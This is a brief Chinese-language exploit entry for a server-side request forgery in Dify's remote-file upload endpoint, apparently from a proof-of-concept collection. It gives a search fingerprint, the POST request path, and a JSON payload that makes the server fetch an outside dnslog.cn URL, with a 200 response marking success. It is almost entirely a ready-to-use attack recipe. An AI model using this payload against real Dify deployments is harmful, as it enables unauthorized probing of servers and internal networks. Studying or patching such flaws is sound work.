# Difyupload存在SSRF漏洞

Dify ｜ SSRF ｜ —
- **指纹**：`title="Dify"`
- **请求**：`POST /console/api/remote-files/upload HTTP/1.1`

**Payload**
```
{"url":"http://dnslog.cn/ssrf-test"}
```
- **响应特征**：200